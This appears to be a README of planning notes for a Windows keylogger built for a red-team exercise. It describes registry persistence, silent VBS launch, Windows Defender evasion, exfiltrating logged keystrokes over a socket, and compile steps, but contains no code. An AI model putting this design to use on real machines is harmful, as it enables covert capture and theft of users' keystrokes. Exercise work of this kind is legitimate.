# Keylogger and Malware
by bryant :D
- Need to figure out a way to deploy this
- if we have admin perms, then HKEY_LOCAL_MACHINE or HKEY_SYSTEM
- if we do not, then HKEY_CURRENT_USER
- undetected by windows defender 
<br>
- Keylogger writes to log.txt file
- Exfiltrates data by attempting to connect to an IP socket and empty the contents of txt.

## TO-DO
- test on windows boxes.
- currently compiled in linux with mingw64. works on arm64 windows.
- need to compile this on a windows openstack box
- Annoyance tool called "gamble"
: generates a file that does a random thing<br>
: prompts user to run file<br>
: if yes, runs file and waits 5 min<br>
: if no, prompts user again and again<br>

### Compile
Change IP address in winconsts.h
<br>
Include libraries ``-lcrypt32 -lws2_32 -mwindows``
- gcc: do ``-s``

### Persistence
- Hybrid setup: main binary stored in Registry, but requires one VBS file to boot silently
- if blue team does not use windows defender, then I can make it so that this does not require VBS script to boot silently.